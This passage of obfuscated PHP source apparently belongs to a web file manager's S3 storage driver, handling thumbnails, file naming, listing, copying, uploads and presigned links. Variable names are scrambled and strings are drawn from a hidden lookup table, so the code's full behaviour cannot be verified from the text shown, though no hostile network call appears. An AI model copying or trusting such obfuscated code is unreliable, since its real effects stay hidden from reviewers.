$êÃ§—ç¢[$¹ö¢Åí‚[98]]; TaskQueue::add($¹ö¢Åí‚[213], $ü‹ğˆ¤›, $ñÌË“êı, $òÒ¬âƒĞ); } public function makeImageCover($Èéµ´Ó, $¯Âƒ¸øÂ, $ö¯‡å“Ï, $­û½Ë±‹) { $˜È¥ÛÅú =& $_SERVER[ü¢ÙÊñÛ]; if (IO::fileNameExist($Èéµ´Ó, $ö¯‡å“Ï)) { return $˜È¥ÛÅú[214]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Å´«›å = DATA_THUMB . $ö¯‡å“Ï; del_file($Å´«›å); $ª¶ê©Ö = IO::copy($¯Âƒ¸øÂ, TEMP_FILES, !1, $ö¯‡å“Ï); if (!@file_exists($ª¶ê©Ö)) { return $˜È¥ÛÅú[215]; } ImageThumb::createThumb($ª¶ê©Ö, $Å´«›å, $­û½Ë±‹, $­û½Ë±‹ * 10); if (@file_exists($Å´«›å)) { Cache::remove($ö¯‡å“Ï); return IO::move($Å´«›å, $Èéµ´Ó); } Cache::set($ö¯‡å“Ï, $˜È¥ÛÅú[207], 600); del_file($Å´«›å); return $˜È¥ÛÅú[216] . $ª¶ê©Ö . $˜È¥ÛÅú[85]; } public function fileOutImageServer($¿²„¶Ñ, $Ëâ¨¤¢Õ = 250) { $this->fileOutImage($¿²„¶Ñ, $Ëâ¨¤¢Õ); } public function fileNameAuto($¥İ×ÇÆƒ, $œ Ë‹Ó, $©¶º±çã = REPEAT_RENAME, $ş«ñùä = false) { $íá¿æ•ô =& $_SERVER[ü¢ÙÊñÛ]; $·ÖüòÕ = $¥İ×ÇÆƒ === $íá¿æ•ô[22] ? $œ Ë‹Ó : rtrim($¥İ×ÇÆƒ, $íá¿æ•ô[18]) . $íá¿æ•ô[18] . $œ Ë‹Ó; if ($©¶º±çã == REPEAT_REPLACE || !$this->exist($·ÖüòÕ) || $ş«ñùä && $©¶º±çã != REPEAT_RENAME_FOLDER) { return $œ Ë‹Ó; } if ($©¶º±çã == REPEAT_SKIP) { return !1; } $äƒç·ä» = $íá¿æ•ô[20] . get_path_ext($œ Ë‹Ó); $äƒç·ä» = $äƒç·ä» == $íá¿æ•ô[20] || $ş«ñùä ? $íá¿æ•ô[22] : $äƒç·ä»; $è èÙá½ = 1; $¥ó€¥øü = substr($œ Ë‹Ó, 0, strlen($œ Ë‹Ó) - strlen($äƒç·ä»)); $ªÚâµ¤Ô = $¥ó€¥øü . "\50{$è èÙá½}\51{$äƒç·ä»}"; while ($this->exist(rtrim($¥İ×ÇÆƒ, $íá¿æ•ô[18]) . $íá¿æ•ô[18] . $ªÚâµ¤Ô)) { $ªÚâµ¤Ô = $¥ó€¥øü . "\50{$è èÙá½}\51{$äƒç·ä»}"; $è èÙá½++; } return $ªÚâµ¤Ô; } private function fileNameAutoList($ŞŠÌùÀ½, $“ƒÚÈíå, $‹Òß¸Õ¨ = false) { $¢¶šƒ¿ï =& $_SERVER[ü¢ÙÊñÛ]; $Õæ›ÄÒ² = $this->listPath($ŞŠÌùÀ½, !0); $Õæ›ÄÒ² = array_merge($Õæ›ÄÒ²[$¢¶šƒ¿ï[96]], $Õæ›ÄÒ²[$¢¶šƒ¿ï[97]]); $äĞ­€à = array_to_keyvalue($Õæ›ÄÒ², $¢¶šƒ¿ï[22], $¢¶šƒ¿ï[42]); $ÎäŸÈ³ü = $¢¶šƒ¿ï[20] . get_path_ext($“ƒÚÈíå); $ÎäŸÈ³ü = $ÎäŸÈ³ü == $¢¶šƒ¿ï[20] || $‹Òß¸Õ¨ ? $¢¶šƒ¿ï[22] : $ÎäŸÈ³ü; $ø‘ÔÒÚ„ = substr($“ƒÚÈíå, 0, strlen($“ƒÚÈíå) - strlen($ÎäŸÈ³ü)); $¢ôĞ³Ä¿ = $ø‘ÔÒÚ„ . "\x28\x30\x29{$ÎäŸÈ³ü}"; for ($»‹›³È = 1; $»‹›³È <= count($äĞ­€à) + 1; $»‹›³È++) { $¢ôĞ³Ä¿ = $ø‘ÔÒÚ„ . "\x28{$»‹›³È}\x29{$ÎäŸÈ³ü}"; if (!in_array_not_case($¢ôĞ³Ä¿, $äĞ­€à)) { return $¢ôĞ³Ä¿; } } return $¢ôĞ³Ä¿; } public function listAllFiles($æ¤Ê•í¼, $ØŠÓ£¢Œ) { $î·Õãğê =& $_SERVER[ü¢ÙÊñÛ]; if (empty($ØŠÓ£¢Œ)) { return array(); } $á‹ö†éÃ = array_keys($ØŠÓ£¢Œ); $–£œİÏ¿ = array(); $æ¤Ê•í¼ = trim($æ¤Ê•í¼, $î·Õãğê[18]); foreach ($ØŠÓ£¢Œ as $ßõÒ¼ª¯ => $¨Ù˜›Õ) { $ã’—‰¨» = ltrim(substr(trim($ßõÒ¼ª¯, $î·Õãğê[18]), strlen($æ¤Ê•í¼)), $î·Õãğê[18]); if (substr($ßõÒ¼ª¯, -1) == $î·Õãğê[18]) { $ã’—‰¨» = rtrim($ã’—‰¨», $î·Õãğê[18]) . $î·Õãğê[18]; } $–£œİÏ¿ = array_merge($–£œİÏ¿, $this->slicePath($ã’—‰¨»)); } $‰»úëê = array(); foreach (array_unique($–£œİÏ¿) as $ÙëÍÇøË) { $×©Æ½í = array($î·Õãğê[98] => $this->getPathOuter($î·Õãğê[18] . $æ¤Ê•í¼ . $î·Õãğê[18] . $ÙëÍÇøË), $î·Õãğê[89] => 1, $î·Õãğê[90] => 0); if (substr($ÙëÍÇøË, -1) != $î·Õãğê[18]) { $×©Æ½í[$î·Õãğê[89]] = 0; $´ÃúÈ–Ü = $this->getPath($æ¤Ê•í¼ . $î·Õãğê[18] . $ÙëÍÇøË); if (isset($ØŠÓ£¢Œ[$´ÃúÈ–Ü])) { $¶Å„óğÌ = $ØŠÓ£¢Œ[$´ÃúÈ–Ü]; if (isset($¶Å„óğÌ[$î·Õãğê[90]])) { $×©Æ½í[$î·Õãğê[90]] = intval($¶Å„óğÌ[$î·Õãğê[90]]); } if (isset($¶Å„óğÌ[$î·Õãğê[217]])) { $×©Æ½í[$î·Õãğê[99]] = intval($¶Å„óğÌ[$î·Õãğê[217]]); } } } $‰»úëê[] = $×©Æ½í; } return $‰»úëê; } public function slicePath($êş‡íÁê) { $ÂĞ“Ã–Û =& $_SERVER[ü¢ÙÊñÛ]; $ÅªÇû•Ï = explode($ÂĞ“Ã–Û[18], trim($êş‡íÁê, $ÂĞ“Ã–Û[18])); $¸Î¸¾Ë­ = 0; do { ++$¸Î¸¾Ë­; $ÙÕÖÌ£¯[] = implode($ÂĞ“Ã–Û[18], array_slice($ÅªÇû•Ï, 0, $¸Î¸¾Ë­)) . $ÂĞ“Ã–Û[18]; } while ($¸Î¸¾Ë­ < count($ÅªÇû•Ï)); $ÙÕÖÌ£¯[count($ÅªÇû•Ï) - 1] = $êş‡íÁê; return $ÙÕÖÌ£¯; } public function getHost() { $ŞøË =& $_SERVER[ü¢ÙÊñÛ]; $’çá½…Ô = parse_url(trim($this->domain, $ŞøË[18])); $ÈœéÊÛõ = isset($’çá½…Ô[$ŞøË[218]]) ? $’çá½…Ô[$ŞøË[218]] : http_type(); $ªÔúèë = isset($’çá½…Ô[$ŞøË[219]]) ? $’çá½…Ô[$ŞøË[219]] : $’çá½…Ô[$ŞøË[98]]; if (isset($’çá½…Ô[$ŞøË[220]])) { $ªÔúèë .= $ŞøË[14] . $’çá½…Ô[$ŞøË[220]]; } return $ÈœéÊÛõ . $ŞøË[221] . $ªÔúèë; } public function pathEncode($ÑÊ‰¡Åò) { $£•Šõƒ =& $_SERVER[ü¢ÙÊñÛ]; return str_replace($£•Šõƒ[222], $£•Šõƒ[18], rawurlencode($ÑÊ‰¡Åò)); } public function writeLog($Ñ¼úÆ½ = '', $˜“Ûˆü« = false) { $‡ùŒà­“ =& $_SERVER[ü¢ÙÊñÛ]; $ĞÖ÷«İ = in_array(ACTION, array($‡ùŒà­“[223], $‡ùŒà­“[224])); if (!$ĞÖ÷«İ && !GLOBAL_DEBUG) { return; } $¡Â³ø˜ã = $Ñ¼úÆ½; static $Äí‘Äş¨ = null; if (!$Äí‘Äş¨) { $Äí‘Äş¨ = strtoupper($this->getType()); } $Ñ¼úÆ½ = $Äí‘Äş¨ . $‡ùŒà­“[225] . $Ñ¼úÆ½; if ($˜“Ûˆü«) { $Í¨´ÔŠì = error_get_last(); if ($Í¨´ÔŠì) { $Ñ¼úÆ½ = array($Ñ¼úÆ½, $Í¨´ÔŠì); } } write_log($Ñ¼úÆ½, $‡ùŒà­“[226]); if ($ĞÖ÷«İ) { throw new Exception($¡Â³ø˜ã); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($‰ ¤ù”â) { set_timeout(); require_once SDK_DIR . $_SERVER[ü¢ÙÊñÛ][227]; parent::__construct(); $this->_init($‰ ¤ù”â); } public function _init($÷ÑŸº¹º) { $ÙÍñÂÏ =& $_SERVER[ü¢ÙÊñÛ]; $this->config = $÷ÑŸº¹º; foreach ($÷ÑŸº¹º as $‹ù·¯Õä => $‰©ç§ ) { if (isset($this->{$‹ù·¯Õä})) { $this->{$‹ù·¯Õä} = $‰©ç§ ; } } $this->endpoint = $÷ÑŸº¹º[$ÙÍñÂÏ[228]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $×°™îâ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($×°™îâ, 0, 7) == $ÙÍñÂÏ[229]) { $×°™îâ = $ÙÍñÂÏ[230] . substr($×°™îâ, 7); } $this->client->setEndpoint($×°™îâ); if (in_array(ACTION, array($ÙÍñÂÏ[223], $ÙÍñÂÏ[224]))) { $this->client->setExceptions(); } } public function setSignVersion($ƒİíà— = "\x76\x34") { $this->signVer = $ƒİíà—; $this->client->setSignVersion($ƒİíà—); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $É¾ºĞŞ) { return null; } } public function isBucketCors() { $ÊÓêÛÉ‘ =& $_SERVER[ü¢ÙÊñÛ]; $ ´¥”Äö = $this->getBucketCors(); if (!$ ´¥”Äö || !is_array($ ´¥”Äö)) { return !1; } if (!is_array($ ´¥”Äö[$ÊÓêÛÉ‘[231]])) { $ ´¥”Äö[$ÊÓêÛÉ‘[231]] = explode($ÊÓêÛÉ‘[60], $ ´¥”Äö[$ÊÓêÛÉ‘[231]]); } if ($ ´¥”Äö[$ÊÓêÛÉ‘[232]] != $ÊÓêÛÉ‘[233] || !in_array($ÊÓêÛÉ‘[233], $ ´¥”Äö[$ÊÓêÛÉ‘[231]])) { return !1; } $×•–£¾ = array_map($ÊÓêÛÉ‘[234], $ ´¥”Äö[$ÊÓêÛÉ‘[235]]); if (!is_array($×•–£¾)) { $×•–£¾ = array(); } $Œç Ä× = array($ÊÓêÛÉ‘[236], $ÊÓêÛÉ‘[237], $ÊÓêÛÉ‘[238], $ÊÓêÛÉ‘[239], $ÊÓêÛÉ‘[240]); $ó¡ö§¯¦ = array_diff($Œç Ä×, $×•–£¾); return empty($ó¡ö§¯¦); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¿‚ÃÛ“Ø, $üæÄÖë‘ = '', $•º†·» = REPEAT_RENAME) { $Êğ®ÁéÎ = $this->setContent($¿‚ÃÛ“Ø, $üæÄÖë‘); if ($Êğ®ÁéÎ !== !1) { return $this->getPathOuter($¿‚ÃÛ“Ø); } return !1; } public function mkdir($Ì±÷Ù¢€, $„îø²Û = REPEAT_SKIP) { $¬–Ï²àÑ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($Ì±÷Ù¢€) && $Ì±÷Ù¢€ !== $¬–Ï²àÑ[241]) { return !1; } if ($„îø²Û && $this->_isFolder($Ì±÷Ù¢€)) { return $this->getPathOuter($Ì±÷Ù¢€); } $Åñçñ€ş = $this->setContent($Ì±÷Ù¢€, $¬–Ï²àÑ[22], !0); if ($Åñçñ€ş !== !1) { return $this->getPathOuter($Ì±÷Ù¢€); } return !1; } public function copyFile($Ëº´Ä›, $µœÚÙù, $¦àíúÒñ = array()) { $¦½ƒË› =& $_SERVER[ü¢ÙÊñÛ]; $¾½¿÷Ü = $this->objectMeta($Ëº´Ä›); if (!$¾½¿÷Ü) { return !1; } if ($¾½¿÷Ü[$¦½ƒË›[90]] <= 1024 * 1024 * 200) { $³µíâÄ³ = $this->client->copyObject($this->bucket, $Ëº´Ä›, $this->bucket, $µœÚÙù, $¦½ƒË›[242], $¦àíúÒñ); } else { $³µíâÄ³ = $this->client->multiCopyObject($this->bucket, $Ëº´Ä›, $this->bucket, $µœÚÙù, $¦àíúÒñ); } $³µíâÄ³ = $³µíâÄ³ ? $this->getPathOuter($µœÚÙù) : !1; return $³µíâÄ³; } public function moveFile($ˆÍ¿…·›, $Øñ±ã‹ß) { if ($this->copyFile($ˆÍ¿…·›, $Øñ±ã‹ß)) { $this->delFile($ˆÍ¿…·›); return $this->getPathOuter($Øñ±ã‹ß); } return !1; } public function delFile($ç÷íéŸ±) { return $this->client->deleteObject($this->bucket, $ç÷íéŸ±); } public function delFolder($›¾õÓÉ‰) { $øé¬ÏÛş =& $_SERVER[ü¢ÙÊñÛ]; if (!$this->exist($›¾õÓÉ‰)) { return !0; } $this->listItemCache = !1; $¡¬ù—”‹ = $this->fileList($›¾õÓÉ‰); $this->listItemCache = !0; $©Öï÷ß = trim($›¾õÓÉ‰, $øé¬ÏÛş[18]) . $øé¬ÏÛş[18]; if (!empty($›¾õÓÉ‰) && $›¾õÓÉ‰ !== $øé¬ÏÛş[241] && !in_array($©Öï÷ß, $¡¬ù—”‹[$øé¬ÏÛş[96]])) { $¡¬ù—”‹[$øé¬ÏÛş[96]][] = $©Öï÷ß; } $È³Á™¿ã = $this->delByBatch($¡¬ù—”‹[$øé¬ÏÛş[97]]); if (!$È³Á™¿ã) { return !1; } $È³Á™¿ã = $this->delByBatch($¡¬ù—”‹[$øé¬ÏÛş[96]]); if (!$È³Á™¿ã) { return !1; } return $this->delFile($©Öï÷ß); } private function delByBatch($Š¶ÔÂ×Å) { foreach (array_chunk($Š¶ÔÂ×Å, 1000) as $¥©Â¿œ¢) { $â˜Œ»‡‚ = $this->client->deleteObjects($this->bucket, $¥©Â¿œ¢); if (!$â˜Œ»‡‚) { return !1; } } return !0; } public function rename($«Á¾Ó½µ, $ŠŸØäÌ) { return $this->renameObject($«Á¾Ó½µ, $ŠŸØäÌ); } public function listPath($³ÒÓæÆœ, $ğ–Œ×´ = false) { $À°Ş˜¬ß =& $_SERVER[ü¢ÙÊñÛ]; $¸çóØ‡ = $this->fileList($³ÒÓæÆœ, $À°Ş˜¬ß[18], !0); foreach ($¸çóØ‡[$À°Ş˜¬ß[96]] as $âñÉÃé˜ => $¯ÉÄçŠõ) { $¸çóØ‡[$À°Ş˜¬ß[96]][$âñÉÃé˜] = $this->folderInfo($¯ÉÄçŠõ, $ğ–Œ×´, $¯ÉÄçŠõ); } foreach ($¸çóØ‡[$À°Ş˜¬ß[97]] as $âñÉÃé˜ => $¯ÉÄçŠõ) { $¸çóØ‡[$À°Ş˜¬ß[97]][$âñÉÃé˜] = $this->fileInfo($¯ÉÄçŠõ[$À°Ş˜¬ß[42]], $ğ–Œ×´, $¯ÉÄçŠõ); } return $¸çóØ‡; } protected function infoChildren($ğÉ³ÂäÒ, &$àˆêëÖ’) { $ˆÄáÈßÆ =& $_SERVER[ü¢ÙÊñÛ]; $‡ˆùúÂø = $this->fileList($ğÉ³ÂäÒ, $ˆÄáÈßÆ[22], !0); $àˆêëÖ’[$ˆÄáÈßÆ[92]] += count($‡ˆùúÂø[$ˆÄáÈßÆ[96]]); $àˆêëÖ’[$ˆÄáÈßÆ[91]] += count($‡ˆùúÂø[$ˆÄáÈßÆ[97]]); foreach ($‡ˆùúÂø[$ˆÄáÈßÆ[97]] as $†¿øÈûó) { if (!$†¿øÈûó || !$†¿øÈûó[$ˆÄáÈßÆ[90]]) { continue; } $àˆêëÖ’[$ˆÄáÈßÆ[90]] += $†¿øÈûó[$ˆÄáÈßÆ[90]]; } } private function fileInfo($êÊÖ”ç, $÷¬®…¼½ = false, $”ÍùÙÅ = array()) { $Çˆ­ÀÕŸ =& $_SERVER[ü¢ÙÊñÛ]; $¼…›„œ¡ = array($Çˆ­ÀÕŸ[42] => $this->pathThis($êÊÖ”ç), $Çˆ­ÀÕŸ[98] => $this->getPathOuter($êÊÖ”ç), $Çˆ­ÀÕŸ[43] => $Çˆ­ÀÕŸ[243], $Çˆ­ÀÕŸ[180] => $this->ext($êÊÖ”ç), $Çˆ­ÀÕŸ[90] => isset($”ÍùÙÅ[$Çˆ­ÀÕŸ[90]]) ? $”ÍùÙÅ[$Çˆ­ÀÕŸ[90]] : 0); if ($÷¬®…¼½) { return $¼…›„œ¡; } $¼…›„œ¡[$Çˆ­ÀÕŸ[244]] = $¼…›„œ¡[$Çˆ­ÀÕŸ[99]] = 0; $¼…›„œ¡[$Çˆ­ÀÕŸ[245]] = $¼…›„œ¡[$Çˆ­ÀÕŸ[246]] = !0; if (empty($”ÍùÙÅ)) { $”ÍùÙÅ = $this->objectMeta($êÊÖ”ç); if (!$”ÍùÙÅ) { return $¼…›„œ¡; } } if (isset($”ÍùÙÅ[$Çˆ­ÀÕŸ[247]]) && $”ÍùÙÅ[$Çˆ­ÀÕŸ[247]]) { $¼…›„œ¡[$Çˆ­ÀÕŸ[248]] = $”ÍùÙÅ[$Çˆ­ÀÕŸ[247]]; } if (isset($”ÍùÙÅ[$Çˆ­ÀÕŸ[217]])) { $¼…›„œ¡[$Çˆ­ÀÕŸ[99]] = $”ÍùÙÅ[$Çˆ­ÀÕŸ[217]]; } if (isset($”ÍùÙÅ[$Çˆ­ÀÕŸ[90]])) { $¼…›„œ¡[$Çˆ­ÀÕŸ[90]] = $”ÍùÙÅ[$Çˆ­ÀÕŸ[90]]; } return $¼…›„œ¡; } private function folderInfo($å¸óªñ , $ıø¸¹Ú = false, $¹­ÍÜ« = array()) { $¤ó¥×ó =& $_SERVER[ü¢ÙÊñÛ]; $ú±ş®©² = array($¤ó¥×ó[42] => $this->pathThis($å¸óªñ ), $¤ó¥×ó[98] => $this->getPathOuter($¤ó¥×ó[18] . $å¸óªñ ), $¤ó¥×ó[43] => $¤ó¥×ó[89]); if ($ıø¸¹Ú) { return $ú±ş®©²; } $ú±ş®©²[$¤ó¥×ó[244]] = $ú±ş®©²[$¤ó¥×ó[99]] = 0; $ú±ş®©²[$¤ó¥×ó[245]] = $ú±ş®©²[$¤ó¥×ó[246]] = !0; if ($å¸óªñ  == $¤ó¥×ó[22]) { return $ú±ş®©²; } if (empty($¹­ÍÜ«)) { $¹­ÍÜ« = $this->objectMeta(trim($å¸óªñ , $¤ó¥×ó[18]) . $¤ó¥×ó[18]); } if (isset($¹­ÍÜ«[$¤ó¥×ó[217]])) { $ú±ş®©²[$¤ó¥×ó[244]] = $¹­ÍÜ«[$¤ó¥×ó[217]]; } return $ú±ş®©²; } private function fileList($‚ë‘Í×, $åÂ‹ÊƒÊ = '', $ä—šú¢ = 0) { $Œ¥äêõÅ =& $_SERVER[ü¢ÙÊñÛ]; $†Ÿ»œì = rtrim($‚ë‘Í×, $Œ¥äêõÅ[18]) . $Œ¥äêõÅ[18]; $¸»“’Œ = $this->listObjs($†Ÿ»œì, null, null, $åÂ‹ÊƒÊ); if (!$¸»“’Œ) { return array($Œ¥äêõÅ[96] => array(), $Œ¥äêõÅ[97] => array()); } $ïÍ²ˆ¤Û = $Ïõ¦”ç = array(); foreach ($¸»“’Œ[$Œ¥äêõÅ[249]] as $îå¦¾çè) { $‚˜€¨¹ù = $îå¦¾çè[$Œ¥äêõÅ[42]]; if ($‚˜€¨¹ù == $†Ÿ»œì) { continue; } $®®ó¯çÄ = isset($îå¦¾çè[$Œ¥äêõÅ[90]]) ? $îå¦¾çè[$Œ¥äêõÅ[90]] : 0; $åº¹ü÷æ = $®®ó¯çÄ == 0 && substr($‚˜€¨¹ù, strlen($‚˜€¨¹ù) - 1, 1) == $Œ¥äêõÅ[18] ? !0 : !1; $this->cacheMethodInfoSet($‚˜€¨¹ù, $åº¹ü÷æ, $îå¦¾çè); if ($åº¹ü÷æ) { $ïÍ²ˆ¤Û[] = $‚˜€¨¹ù; continue; } $Ïõ¦”ç[] = $ä—šú¢ ? $îå¦¾çè : $‚˜€¨¹ù; } foreach ($¸»“’Œ[$Œ¥äêõÅ[250]] as $îå¦¾çè) { $ïÍ²ˆ¤Û[] = $îå¦¾çè[$Œ¥äêõÅ[42]]; $this->cacheMethodInfoSet($îå¦¾çè[$Œ¥äêõÅ[42]], !0); } $this->cacheMethodInfoSet($‚ë‘Í×, !0); return array($Œ¥äêõÅ[96] => $ïÍ²ˆ¤Û, $Œ¥äêõÅ[97] => $Ïõ¦”ç); } private function listObjs($†­Şı¿ı, $Ğ‰öÈ­õ = null, $¡ŒíÊú˜ = null, $ŞÏ–ƒà¨ = null) { $¦šŒ“‘ğ =& $_SERVER[ü¢ÙÊñÛ]; $†­Şı¿ı = trim($†­Şı¿ı, $¦šŒ“‘ğ[18]); $ğ‰³ÕõÄ = empty($†­Şı¿ı) && $†­Şı¿ı !== $¦šŒ“‘ğ[241] ? $¦šŒ“‘ğ[22] : $†­Şı¿ı . $¦šŒ“‘ğ[18]; return $this->client->getBucket($this->bucket, $ğ‰³ÕõÄ, $Ğ‰öÈ­õ, $¡ŒíÊú˜, $ŞÏ–ƒà¨, !0); } public function has($É•§ªÖí, $Ãª¿ù· = false, $³·Ò÷Óš = true) { $¼ºÃ´ï‘ =& $_SERVER[ü¢ÙÊñÛ]; $É•§ªÖí = trim($É•§ªÖí, $¼ºÃ´ï‘[18]); $ßÒÜ‹èÀ = empty($É•§ªÖí) && $É•§ªÖí !== $¼ºÃ´ï‘[241] ? $¼ºÃ´ï‘[22] : $É•§ªÖí . $¼ºÃ´ï‘[18]; $ê‘½ÀÄ‚ = null; $ÑİŒ¶Ñ = 500; $˜Õ¾²áÍ = $¼ºÃ´ï‘[18]; $Ş‰¡œ­Ú = $¢¶ñ¡ = array(); while (!0) { $ş¯‡ÖêŸ = $this->listObjs($É•§ªÖí, $ê‘½ÀÄ‚, $ÑİŒ¶Ñ, $˜Õ¾²áÍ); if (!$ş¯‡ÖêŸ) { break; } $ê‘½ÀÄ‚ = $ş¯‡ÖêŸ[$¼ºÃ´ï‘[251]]; $¼â·ì½¬ = $ş¯‡ÖêŸ[$¼ºÃ´ï‘[249]]; $»½’ƒ¹ˆ = $ş¯‡ÖêŸ[$¼ºÃ´ï‘[250]]; if (empty($¼â·ì½¬) && empty($»½’ƒ¹ˆ)) { break; } if (count($¼â·ì½¬) == 1 && $¼â·ì½¬[0][$¼ºÃ´ï‘[42]] == $ßÒÜ‹èÀ) { break; } if ($Ãª¿ù·) { if (count($¼â·ì½¬)) { $¼â·ì½¬ = array_column($¼â·ì½¬, $¼ºÃ´ï‘[42]); $Ş‰¡œ­Ú = array_merge($Ş‰¡œ­Ú, $¼â·ì½¬); } if (count($»½’ƒ¹ˆ)) { $»½’ƒ¹ˆ = array_column($»½’ƒ¹ˆ, $¼ºÃ´ï‘[42]); $¢¶ñ¡ = array_merge($¢¶ñ¡, $»½’ƒ¹ˆ); } if ($ê‘½ÀÄ‚ === null) { break; } continue; } if ($³·Ò÷Óš) { if (!empty($¼â·ì½¬)) { if (count($¼â·ì½¬) > 1 || isset($¼â·ì½¬[0][$¼ºÃ´ï‘[42]]) && $¼â·ì½¬[0][$¼ºÃ´ï‘[42]] != $ßÒÜ‹èÀ) { return !0; } } } else { if (!empty($»½’ƒ¹ˆ)) { return !0; } } if ($ê‘½ÀÄ‚ === null) { break; } } if ($Ãª¿ù·) { $Ş‰¡œ­Ú = array_diff($Ş‰¡œ­Ú, array($ßÒÜ‹èÀ)); $Ş‰¡œ­Ú = count(array_unique($Ş‰¡œ­Ú)); $¢¶ñ¡ = count(array_unique($¢¶ñ¡)); return array($¼ºÃ´ï‘[252] => $Ş‰¡œ­Ú, $¼ºÃ´ï‘[253] => $¢¶ñ¡); } return !1; } public function listAll($í–¾–‹Ó) { $øŒÂÃ¿Ê =& $_SERVER[ü¢ÙÊñÛ]; $œŠö¬ƒô = $this->fileList($í–¾–‹Ó, $øŒÂÃ¿Ê[22], !0); $ Ü¤‰®Ø = array_to_keyvalue($œŠö¬ƒô[$øŒÂÃ¿Ê[97]], $øŒÂÃ¿Ê[42]); foreach ($œŠö¬ƒô[$øŒÂÃ¿Ê[96]] as $ù‚ ùæõ) { if (is_string($ù‚ ùæõ)) { $ Ü¤‰®Ø[$ù‚ ùæõ] = array($øŒÂÃ¿Ê[90] => 0); } } return $this->listAllFiles($í–¾–‹Ó, $ Ü¤‰®Ø); } public function canRead($Ê‰„™»ë) { $  éåıß =& $_SERVER[ü¢ÙÊñÛ]; $øğïà­¥ = $this->client->getAccessControlPolicy($this->bucket, $Ê‰„™»ë); if (!$øğïà­¥) { return !1; } return in_array($øğïà­¥, array($  éåıß[254], $  éåıß[255], $  éåıß[256])) ? !0 : !1; } public function canWrite($¬¹ØÓ‡Ä) { $œ¹ÉîôÅ =& $_SERVER[ü¢ÙÊñÛ]; $Ÿ‹±«üÓ = $this->client->getAccessControlPolicy($this->bucket, $¬¹ØÓ‡Ä); if (!$Ÿ‹±«üÓ) { return !1; } return in_array($Ÿ‹±«üÓ, array($œ¹ÉîôÅ[254], $œ¹ÉîôÅ[255])) ? !0 : !1; } public function getContent($ß‡³ãø×) { return $this->client->getObject($this->bucket, $ß‡³ãø×); } public function setContent($àç·±è¨, $Á©í›ÓÓ = '', $Ù†Üğû = false) { $œ‚ê™µ” =& $_SERVER[ü¢ÙÊñÛ]; $àç·±è¨ = $Ù†Üğû ? trim($àç·±è¨, $œ‚ê™µ”[18]) . $œ‚ê™µ”[18] : $àç·±è¨; $ĞêÕøÑÁ = get_file_mime(get_path_ext($àç·±è¨)); $£şÇ¤¤„ = $this->client->putObject($Á©í›ÓÓ, $this->bucket, $àç·±è¨, $œ‚ê™µ”[242], array(), $ĞêÕøÑÁ); if (!$£şÇ¤¤„) { return !1; } if ($Ù†Üğû) { return !0; } return $£şÇ¤¤„ ? !0 : !1; } public function fileSubstr($õÉ“ô‡, $ñ‚œ†, $¥ıÛø±) { $ÆãŠœÕˆ = $ñ‚œ† + $¥ıÛø± - 1; return $this->client->getObject($this->bucket, $õÉ“ô‡, array($_SERVER[ü¢ÙÊñÛ][257] => "\x62\171\164\x65\x73\75{$ñ‚œ†}\x2d{$ÆãŠœÕˆ}")); } public function upload($…›ÚÚä, $Ê¯ƒ¶ÎÂ, $Ûú†¬Ü = false, $¥ºï‹ƒè = REPEAT_REPLACE) { $Ï¸¯è¼ =& $_SERVER[ü¢ÙÊñÛ]; $ûß¨¸·³ = array($Ï¸¯è¼[258] => @md5_file($Ê¯ƒ¶ÎÂ)); $‡ñ¸œÍ„ = array($Ï¸¯è¼[259] => get_file_mime(get_path_ext($…›ÚÚä))); if (IO::size($Ê¯ƒ¶ÎÂ) <= 1024 * 1024 * 200) { $ûüê¸•Ô = $this->client->putObjectFile($Ê¯ƒ¶ÎÂ, $this->bucket, $…›ÚÚä, $Ï¸¯è¼[242], $ûß¨¸·³, $‡ñ¸œÍ„); return !empty($ûüê¸•Ô) ? $this->getPathOuter($…›ÚÚä) : !1; } $ ¢¸óÈÛ = $this->client->multiUploadObject($Ê¯ƒ¶ÎÂ, $this->bucket, trim($…›ÚÚä, $Ï¸¯è¼[18]), $ûß¨¸·³, $‡ñ¸œÍ„); return $ ¢¸óÈÛ ? $this->getPathOuter($…›ÚÚä) : !1; } public function download($š…“‰É, $¡÷ûè•õ) { if (!@is_dir($this->pathFather($¡÷ûè•õ)) && !IO::mkdir($this->pathFather($¡÷ûè•õ))) { return !1; } $í°ôî×› = $this->client->getObject($this->bucket, $š…“‰É, array(), $¡÷ûè•õ); return $í°ôî×› !== !1 ? $¡÷ûè•õ : !1; } public function link($Ÿ¥®‡Æ, $±³çïºÜ = array()) { return $this->getPreSignedURL($Ÿ¥®‡Æ, 3600 * 12, $±³çïºÜ); } private function getPreSignedURL($²…ÒåÓµ, $ª‘ïàÌÔ, $ó‚§í˜ì = array(), $³·çÛÇò = "\107\x45\x54") { $À’Â¥˜¤ =& $_SERVER[ü¢ÙÊñÛ]; $²…ÒåÓµ = trim($²…ÒåÓµ, $À’Â¥˜¤[18]); if ($this->signVer == $À’Â¥˜¤[260]) { return $this->client->getPreSignedV2URL($this->bucket, $²…ÒåÓµ, $ª‘ïàÌÔ, $³·çÛÇò, $ó‚§í˜ì); } return $this->client->getPreSignedV4URL($this->bucket, $²…ÒåÓµ, $ª‘ïàÌÔ, array(), $³·çÛÇò, $ó‚§í˜ì); } public function fileOut($üÊöõì±, $±›ú­åé = false, $­Âğ¯ = false, $³ìªÍ = '') { $çÆÛ¤‹· =& $_SERVER[ü¢ÙÊñÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($üÊöõì±, $±›ú­åé, $­Âğ¯, $³ìªÍ); } if (!$­Âğ¯) { $­Âğ¯ = $this->pathThis($üÊöõì±); } $¸òûë”µ = get_file_mime(get_path_ext($­Âğ¯)); if ($¸òûë”µ == $çÆÛ¤‹·[261]) { return parent::fileOut($üÊöõì±, $±›ú­åé, $­Âğ¯, $³ìªÍ); } $“ùƒßòÎ = 